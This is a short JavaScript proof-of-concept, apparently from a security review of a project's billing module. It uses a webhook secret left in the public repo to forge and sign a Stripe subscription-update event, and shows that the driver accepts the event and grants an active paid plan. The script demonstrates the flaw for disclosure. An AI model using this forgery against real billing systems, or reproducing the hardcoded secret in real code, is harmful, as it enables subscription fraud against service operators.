import { FakeStripeDriver, signFakeWebhook } from '../src/billing/stripe-fake.driver.js';
// The secret an attacker reads straight out of the public repo.
const LEAKED = 'fake-webhook-secret-for-dev';
const d = new FakeStripeDriver();          // exactly how billing.module.ts builds it
console.log('driver secret from env?', process.env.STRIPE_WEBHOOK_SECRET ?? '(unset)');
console.log('driver secret in use   :', d.getSecret());
const forged = JSON.stringify({
  id: 'evt_forged_1', type: 'customer.subscription.updated',
  data: { object: { id: 'sub_forged', customer: 'cus_fake_TENANTID', status: 'active',
    cancel_at_period_end: false, canceled_at: null,
    items: { data: [{ price: { id: 'price_seed_institutional' },
      current_period_start: Math.floor(Date.now()/1000),
      current_period_end: Math.floor(Date.now()/1000)+2592000 }] } } },
});
const hdr = signFakeWebhook(forged, LEAKED);
const ev = d.verifyWebhookSignature(Buffer.from(forged), hdr);
console.log('FORGED EVENT ACCEPTED:', ev.id, ev.type);
